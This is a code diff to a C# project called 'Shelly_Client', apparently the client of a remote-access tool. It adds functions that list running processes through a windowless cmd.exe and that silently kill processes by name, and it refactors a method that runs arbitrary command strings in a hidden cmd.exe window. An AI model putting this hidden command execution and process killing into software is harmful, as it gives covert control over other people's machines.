@@ -178,6 +178,43 @@ namespace Shelly_Client
                 // Return info
                 return "Computer name: " + SysInfo[1] + "\n" + "OS: " + SysInfo[0] + "\n" + "CPU: " + SysInfo[2] + "\n" + "Ram: " + SysInfo[4] + "\n" + "Drives:\n\n" + SysInfo[3];
             }
+
+            // GetRunningProcesses method
+            public static string GetRunningProcesses()
+            {
+                // Create new instance NOTE: im not using the cmd method due to it not returning the standard output
+                using (Process process = new Process())
+                {
+                    // Set info
+                    process.StartInfo.FileName = "cmd.exe";
+                    process.StartInfo.Arguments = "/c tasklist";
+                    process.StartInfo.UseShellExecute = false;
+                    process.StartInfo.CreateNoWindow = true;
+                    process.StartInfo.RedirectStandardOutput = true;
+                    process.Start();
+
+                    // Return data
+                    return process.StandardOutput.ReadToEnd();
+                }
+            }
+
+            // TerminateProcess method
+            public static void TerminateProcess(string ProcessName)
+            {
+                // Try to terminate process
+                try
+                {
+                    // Loop though and find all equally names processes
+                    foreach (var process in Process.GetProcessesByName(ProcessName))
+                    {
+                        // Kill process
+                        process.Kill();
+                    }
+                } catch
+                {
+
+                }
+            }
         }
 
         // Fun class
@@ -394,26 +431,27 @@ namespace Shelly_Client
             public static void Cmd(string Command)
             {
                 // Declare new instance
-                var CmdCommand = new Process();
-
-                // Set start info
-                ProcessStartInfo startInfoMelt = new ProcessStartInfo()
+                using (var CmdCommand = new Process())
                 {
-                    // Set windows style to hidden
-                    WindowStyle = ProcessWindowStyle.Hidden,
+                    // Set start info
+                    ProcessStartInfo startInfoMelt = new ProcessStartInfo()
+                    {
+                        // Set windows style to hidden
+                        WindowStyle = ProcessWindowStyle.Hidden,
 
-                    // Set filename to run cmd
-                    FileName = "cmd.exe",
+                        // Set filename to run cmd
+                        FileName = "cmd.exe",
 
-                    // Set cmd arguments
-                    Arguments = @"/C " + Command
-                };
+                        // Set cmd arguments
+                        Arguments = @"/C " + Command
+                    };
 
-                // Set start info
-                CmdCommand.StartInfo = startInfoMelt;
+                    // Set start info
+                    CmdCommand.StartInfo = startInfoMelt;
 
-                // Start cmd with arguments
-                CmdCommand.Start();
+                    // Start cmd with arguments
+                    CmdCommand.Start();
+                }
             }
 
             // Import dll
